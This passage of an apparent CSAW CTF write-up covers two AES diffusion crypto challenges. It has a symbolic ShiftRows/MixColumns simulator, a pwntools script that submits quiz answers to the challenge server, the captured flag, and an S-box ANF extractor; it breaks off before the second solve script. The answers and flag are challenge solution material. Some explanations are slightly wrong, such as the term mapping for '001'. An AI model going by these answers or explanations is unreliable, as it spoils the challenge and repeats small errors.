+</span></span><span class="line"><span class="cl">    <span class="n">new_columns</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">column_index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N_COLS</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">column</span> <span class="o">=</span> <span class="n">GetStateColumn</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">column_index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">new_column</span> <span class="o">=</span> <span class="n">MultiplyColumn</span><span class="p">(</span><span class="n">column</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">new_columns</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">new_column</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Transpose</span><span class="p">(</span><span class="n">new_columns</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Transpose</span><span class="p">(</span><span class="n">matrix</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[[</span><span class="n">matrix</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">matrix</span><span class="p">))]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">]))]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">PrettyPrint</span><span class="p">(</span><span class="n">matrix</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">matrix</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">row</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">PrettyPrint2</span><span class="p">(</span><span class="n">matrix</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">matrix</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">element</span> <span class="ow">in</span> <span class="n">row</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">element</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">state</span> <span class="o">=</span> <span class="p">[[</span><span class="s2">&#34;x0&#34;</span><span class="p">,</span> <span class="s2">&#34;x4&#34;</span><span class="p">,</span> <span class="s2">&#34;x8&#34;</span><span class="p">,</span> <span class="s2">&#34;x12&#34;</span><span class="p">],</span> 
+</span></span><span class="line"><span class="cl">         <span class="p">[</span><span class="s2">&#34;x1&#34;</span><span class="p">,</span> <span class="s2">&#34;x5&#34;</span><span class="p">,</span> <span class="s2">&#34;x9&#34;</span><span class="p">,</span> <span class="s2">&#34;x13&#34;</span><span class="p">],</span> 
+</span></span><span class="line"><span class="cl">         <span class="p">[</span><span class="s2">&#34;x2&#34;</span><span class="p">,</span> <span class="s2">&#34;x6&#34;</span><span class="p">,</span> <span class="s2">&#34;x10&#34;</span><span class="p">,</span> <span class="s2">&#34;x14&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">         <span class="p">[</span><span class="s2">&#34;x3&#34;</span><span class="p">,</span> <span class="s2">&#34;x7&#34;</span><span class="p">,</span> <span class="s2">&#34;x11&#34;</span><span class="p">,</span> <span class="s2">&#34;x15&#34;</span><span class="p">]]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">AESRound</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">MixColumns</span><span class="p">(</span><span class="n">ShiftRows</span><span class="p">(</span><span class="n">state</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">AES</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">rounds</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">rounds</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">AESRound</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">state</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">PrettyPrint</span><span class="p">(</span><span class="n">AES</span><span class="p">(</span><span class="n">state</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span>
+</span></span></code></pre></div><p>The Python code simulates parts of the AES (Advanced Encryption Standard) encryption process, specifically focusing on <strong>ShiftRows</strong> and <strong>MixColumns</strong> operations. Here&rsquo;s a short explanation:</p>
+<h4 id="key-operations">Key Operations:<a hidden class="anchor" aria-hidden="true" href="#key-operations">#</a></h4>
+<ol>
+<li>
+<p><strong>ShiftRows:</strong></p>
+<ul>
+<li>Each row of the 4x4 state matrix is shifted to the left by a certain number of positions, where the first row is not shifted, the second row is shifted by 1 position, and so on.</li>
+</ul>
+</li>
+<li>
+<p><strong>MixColumns:</strong></p>
+<ul>
+<li>Each column of the state matrix is multiplied by a fixed 4x4 matrix using modular arithmetic (though here, the code generates string expressions to represent this multiplication).</li>
+</ul>
+</li>
+</ol>
+<h4 id="functions">Functions:<a hidden class="anchor" aria-hidden="true" href="#functions">#</a></h4>
+<ul>
+<li><strong><code>ShiftRows(state)</code></strong>: Shifts rows of the state matrix cyclically.</li>
+<li><strong><code>MixColumns(state)</code></strong>: Mixes the columns of the matrix by multiplying each with a fixed transformation matrix.</li>
+<li><strong><code>AESRound(state)</code></strong>: Performs one round of AES by applying ShiftRows and MixColumns.</li>
+<li><strong><code>AES(state, rounds)</code></strong>: Runs multiple rounds of AES on the state matrix.</li>
+</ul>
+<h4 id="example">Example:<a hidden class="anchor" aria-hidden="true" href="#example">#</a></h4>
+<p>The code initializes a 4x4 matrix (the state) with symbolic values (<code>x0</code>, <code>x1</code>, &hellip;, <code>x15</code>), performs 2 rounds of AES, and prints the final matrix.</p>
+<p>The goal is to simulate the AES encryption transformations in a simplified, symbolic way, without performing actual byte-level encryption.</p>
+<h2 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h2>
+<p>I will write a Python script using the <code>pwntools</code> library to exploit the AES diffusion challenge. First, I will connect to the server using <code>nc diffusion.ctf.csaw.io 5000</code>. Once connected, I will send the following input matrix that simulates part of the AES encryption process:</p>
+<pre tabindex="0"><code>[[&#39;x0&#39;, &#39;x4&#39;, &#39;x8&#39;, &#39;x12&#39;], 
+ [&#39;x5&#39;, &#39;x9&#39;, &#39;x13&#39;, &#39;x1&#39;], 
+ [&#39;x10&#39;, &#39;x14&#39;, &#39;x2&#39;, &#39;x6&#39;], 
+ [&#39;x15&#39;, &#39;x3&#39;, &#39;x7&#39;, &#39;x11&#39;]]
+</code></pre><p>After that, I will input the matrix transformation that applies the MixColumns step in AES. This will look like:</p>
+<pre tabindex="0"><code>[[&#39;2*x0 + 3*x5 + 1*x10 + 1*x15&#39;, ... (more matrixes here)]
+</code></pre><p>Then, I will provide the variables to simulate column mixing and input their respective values. I will also confirm that no other operations need to be done and set a few of the variables to zero to influence the output.</p>
+<p>Finally, after providing a formula for transformation and confirming that I do not need further diffusion, I will receive the correct output and retrieve the flag, which will complete the challenge.
+So our final script is:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;diffusion.ctf.csaw.io&#34;</span><span class="p">,</span><span class="mi">5000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;answer&#34;</span><span class="p">,</span><span class="s2">&#34;[[&#39;x0&#39;, &#39;x4&#39;, &#39;x8&#39;, &#39;x12&#39;], [&#39;x5&#39;, &#39;x9&#39;, &#39;x13&#39;, &#39;x1&#39;], [&#39;x10&#39;, &#39;x14&#39;, &#39;x2&#39;, &#39;x6&#39;], [&#39;x15&#39;, &#39;x3&#39;, &#39;x7&#39;, &#39;x11&#39;]]&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;answer&#34;</span><span class="p">,</span><span class="s2">&#34;[[&#39;2*x0 + 3*x5 + 1*x10 + 1*x15&#39;, &#39;2*x4 + 3*x9 + 1*x14 + 1*x3&#39;, &#39;2*x8 + 3*x13 + 1*x2 + 1*x7&#39;, &#39;2*x12 + 3*x1 + 1*x6 + 1*x11&#39;], [&#39;1*x0 + 2*x5 + 3*x10 + 1*x15&#39;, &#39;1*x4 + 2*x9 + 3*x14 + 1*x3&#39;, &#39;1*x8 + 2*x13 + 3*x2 + 1*x7&#39;, &#39;1*x12 + 2*x1 + 3*x6 + 1*x11&#39;], [&#39;1*x0 + 1*x5 + 2*x10 + 3*x15&#39;, &#39;1*x4 + 1*x9 + 2*x14 + 3*x3&#39;, &#39;1*x8 + 1*x13 + 2*x2 + 3*x7&#39;, &#39;1*x12 + 1*x1 + 2*x6 + 3*x11&#39;], [&#39;3*x0 + 1*x5 + 1*x10 + 2*x15&#39;, &#39;3*x4 + 1*x9 + 1*x14 + 2*x3&#39;, &#39;3*x8 + 1*x13 + 1*x2 + 2*x7&#39;, &#39;3*x12 + 1*x1 + 1*x6 + 2*x11&#39;]]&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;al order&#34;</span><span class="p">,</span><span class="s2">&#34;x0,x5,x10,x15&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;al order&#34;</span><span class="p">,</span><span class="s2">&#34;x2,x7,x8,x13&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;(yes/no)&#34;</span><span class="p">,</span><span class="s2">&#34;no&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;answer&#34;</span><span class="p">,</span><span class="s2">&#34;12&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;al order&#34;</span><span class="p">,</span><span class="s2">&#34;x0:1,x5:1,x10:1,x15:1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;al order&#34;</span><span class="p">,</span><span class="s2">&#34;x0:0,x1:0,x2:0,x3:0,x4:0,x5:0,x6:0,x7:0,x8:0,x9:0,x10:0,x11:0,x12:0,x13:0,x14:0,x15:0&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;al order&#34;</span><span class="p">,</span><span class="s2">&#34;x0&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;tor code&#34;</span><span class="p">,</span><span class="s2">&#34;(2*(2*x0 + 3*x1 + 1*x2 + 1*x3) + 3*(1*x0 + 2*x1 + 3*x2 + 1*x3) + 1*(1*x0 + 1*x1 + 2*x2 + 3*x3) + 1*(3*x0 + 1*x1 + 1*x2 + 2*x3))&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;iffusion?&#34;</span><span class="p">,</span><span class="s2">&#34;no&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span>
+</span></span></code></pre></div><p><img loading="lazy" src="Pasted%20image%2020240908081935.png" alt=""  />
+
+And there we go, we have the flag as <code>csawctf{1_n0w_und3r5t4nd_435_d1ffu510n}</code>.</p>
+<h1 id="diffusion-pop-quiz-crypto">Diffusion Pop Quiz (Crypto)<a hidden class="anchor" aria-hidden="true" href="#diffusion-pop-quiz-crypto">#</a></h1>
+<p>Here we are given <code>ans_extractor.py</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># To ensure correctly formatted answers for the challenge, use 1-indexed values for the output bits.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># For example, if you have an S-Box of 8 bits to 8 bits, the first output bit is 1, the second is 2, and so forth.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Your ANF expression will have the variables y1, y2, ..., y8.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Put your S-Boxes here.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">example</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 3 input bits: 000, 001, 010, 011, 100, 101, 110, 111</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Array indexes: 0    1    2    3    4    5    6    7</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># f(x1,x2,x3):   0    1    0    0    0    1    1    1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Customize the following settings to extract specific bits of specific S-Boxes and have a comfortable visualization of terms.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">SYMBOL</span> <span class="o">=</span> <span class="s1">&#39;x&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">INPUT_BITS</span> <span class="o">=</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="n">OUTPUT_BITS</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">SBOX</span> <span class="o">=</span> <span class="n">example</span>
+</span></span><span class="line"><span class="cl"><span class="n">BIT</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Ignore the functions, we&#39;ve implemented this for you to save your time.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Don&#39;t touch it, it might break and we don&#39;t want that, right? ;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_sbox_result</span><span class="p">(</span><span class="n">input_int</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">SBOX</span><span class="p">[</span><span class="n">input_int</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_term</span><span class="p">(</span><span class="n">binary_string</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">term</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">count</span><span class="p">,</span><span class="n">bit</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">binary_string</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">bit</span> <span class="o">==</span> <span class="s2">&#34;1&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">term</span> <span class="o">+=</span> <span class="n">SYMBOL</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;*&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">term</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;1&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">term</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_poly</span><span class="p">(</span><span class="n">inputs</span><span class="p">,</span> <span class="n">outputs</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">poly</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">inputs</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">outputs</span><span class="p">[</span><span class="n">v</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">poly</span> <span class="o">+=</span> <span class="n">get_term</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;+&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">poly</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">should_sum</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">u</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_as</span><span class="p">(</span><span class="n">vs</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">vs</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">a</span><span class="p">[</span><span class="n">v</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">u</span> <span class="ow">in</span> <span class="n">vs</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">should_sum</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">a</span><span class="p">[</span><span class="n">v</span><span class="p">]</span> <span class="o">^=</span> <span class="n">f</span><span class="p">[</span><span class="n">u</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">a</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_anf</span><span class="p">(</span><span class="n">vs</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">get_poly</span><span class="p">(</span><span class="n">vs</span><span class="p">,</span> <span class="n">get_as</span><span class="p">(</span><span class="n">vs</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">n</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_vs_and_fis_from_sbox</span><span class="p">(</span><span class="n">which_fi</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vs</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fis</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">input_integer</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="n">INPUT_BITS</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sbox_output</span> <span class="o">=</span> <span class="n">get_sbox_result</span><span class="p">(</span><span class="n">input_integer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">input_integer_binary</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">input_integer</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="n">INPUT_BITS</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fis</span><span class="p">[</span><span class="n">input_integer_binary</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sbox_output_binary</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">sbox_output</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="n">OUTPUT_BITS</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">vs</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">input_integer_binary</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fis</span><span class="p">[</span><span class="n">input_integer_binary</span><span class="p">]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sbox_output_binary</span><span class="p">[</span><span class="n">which_fi</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">vs</span><span class="p">,</span> <span class="n">fis</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_anf_from_sbox_fi</span><span class="p">(</span><span class="n">which_fi</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vs</span><span class="p">,</span> <span class="n">fis</span> <span class="o">=</span> <span class="n">get_vs_and_fis_from_sbox</span><span class="p">(</span><span class="n">which_fi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">poly</span> <span class="o">=</span> <span class="n">get_anf</span><span class="p">(</span><span class="n">vs</span><span class="p">,</span> <span class="n">fis</span><span class="p">,</span> <span class="n">INPUT_BITS</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">poly</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="n">get_anf_from_sbox_fi</span><span class="p">(</span><span class="n">BIT</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+</span></span></code></pre></div><p>This code generates the Algebraic Normal Form (ANF) of a Boolean function corresponding to the output bit(s) of an S-Box. Here&rsquo;s an explanation:</p>
+<h4 id="key-concepts">Key Concepts:<a hidden class="anchor" aria-hidden="true" href="#key-concepts">#</a></h4>
+<ul>
+<li><strong>S-Box</strong>: A substitution box used in cryptographic algorithms to perform a substitution of input bits with output bits. It&rsquo;s a non-linear mapping of input to output.</li>
+<li><strong>ANF (Algebraic Normal Form)</strong>: A way to represent Boolean functions using XOR and AND operations. ANF expressions are polynomials with binary coefficients (0 or 1).</li>
+<li><strong>Input/Output Bits</strong>: The S-Box takes a fixed number of input bits and returns output bits. In this example, 3 input bits map to 1 output bit.</li>
+</ul>
+<h4 id="code-breakdown">Code Breakdown:<a hidden class="anchor" aria-hidden="true" href="#code-breakdown">#</a></h4>
+<ol>
+<li>
+<p><strong>Settings:</strong></p>
+<ul>
+<li><code>SYMBOL = 'x'</code>: The variables used for the input bits (e.g., <code>x1</code>, <code>x2</code>, <code>x3</code>).</li>
+<li><code>INPUT_BITS = 3</code>: The S-Box uses 3 input bits (<code>x1</code>, <code>x2</code>, <code>x3</code>), resulting in 8 possible input values (from <code>000</code> to <code>111</code>).</li>
+<li><code>OUTPUT_BITS = 1</code>: The S-Box outputs 1 bit.</li>
+<li><code>SBOX = example</code>: The example S-Box provides a mapping of the 8 possible input values to 1 output bit each.</li>
+</ul>
+</li>
+<li>
+<p><strong>ANF Extraction Process:</strong></p>
+<ul>
+<li><strong><code>get_sbox_result(input_int)</code></strong>: Returns the S-Box output for a given input.</li>
+<li><strong><code>get_term(binary_string)</code></strong>: Converts a binary input string (e.g., <code>001</code>) to a polynomial term (e.g., <code>x2</code>).</li>
+<li><strong><code>get_poly(inputs, outputs)</code></strong>: Constructs the ANF polynomial from the terms that contribute to the output.</li>
+<li><strong><code>get_vs_and_fis_from_sbox(which_fi)</code></strong>: Extracts input-output pairs for the S-Box and identifies which output bit is being analyzed (based on <code>BIT</code>).</li>
+<li><strong><code>get_anf(vs, f, n)</code></strong>: Combines input-output relationships into the ANF expression using XOR and AND operations.</li>
+</ul>
+</li>
+<li>
+<p><strong>The Process:</strong></p>
+<ul>
+<li>The code analyzes the S-Box example, which maps 3 input bits to 1 output bit.</li>
+<li>For each input bit pattern (from <code>000</code> to <code>111</code>), it checks the corresponding output bit and builds an ANF representation for that output bit.</li>
+<li>The final output is a polynomial representing the selected output bit in ANF form.</li>
+</ul>
+</li>
+</ol>
+<h4 id="example-1">Example:<a hidden class="anchor" aria-hidden="true" href="#example-1">#</a></h4>
+<p>If we have the following example S-Box:</p>
+<pre tabindex="0"><code>example = [1, 0, 0, 0, 1, 1, 1, 0]  # 3 input bits -&gt; 1 output bit
+</code></pre><p>For input <code>000</code>, the S-Box outputs <code>1</code>. For input <code>001</code>, it outputs <code>0</code>, and so on.</p>
+<p>The goal of the script is to generate a Boolean polynomial for the output bit of the S-Box, based on the input bits.</p>
+<h4 id="output">Output:<a hidden class="anchor" aria-hidden="true" href="#output">#</a></h4>
+<p>The script prints the ANF expression for the given output bit. For the example provided, the expression might look something like:</p>
+<pre tabindex="0"><code>x1*x2 + x3 + 1
+</code></pre><p>This indicates that the output bit depends on a combination of the input bits in this particular form.</p>
+<h2 id="exploit-1">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-1">#</a></h2>
+<p>To exploit the diffusion challenge at <code>diffusion-pop-quiz.ctf.csaw.io</code>, I will connect to the server and interact with it based on the specific prompts provided.</p>
+<p>First, I will establish a connection using <code>pwn</code> and input my initial response when prompted. The remote server will ask for an answer to a question, and I will respond with “a”. Following this, I will encounter a query about the answer being correct, to which I will respond with “no”.</p>
+<p>Next, when the server asks, “Diffusion matters a lot, right?”, I will send the reply, “Diffusion matters a lot”. Once prompted with the hexadecimal number, I will enter <code>'0x16'</code>.</p>
+<p>The server will then ask for Boolean expressions. I will systematically input the appropriate expressions, starting with:</p>
+<ul>
+<li><code>x3+x2*x3+x1*x2</code></li>
+<li>Then, repeat <code>x3+x2*x3+x1*x2</code>.</li>
+<li>I will follow this up with the larger expression: <code>1+x3+x2+x2*x3+x1*x3+x1*x2</code>.</li>
+</ul>
+<p>The final large Boolean expression will be quite complex, but I will input it in response to the server’s prompts.</p>
+<p>For the last few steps, I will input the variable order as <code>x1,x2,x3,x4,x5,x6,x7,x8</code> and respond with &ldquo;yes&rdquo; when the server asks for confirmation.</p>
+<p>The server will continue to prompt me for more Boolean expressions, to which I will provide the appropriate responses.
+With all these our final script is:</p>
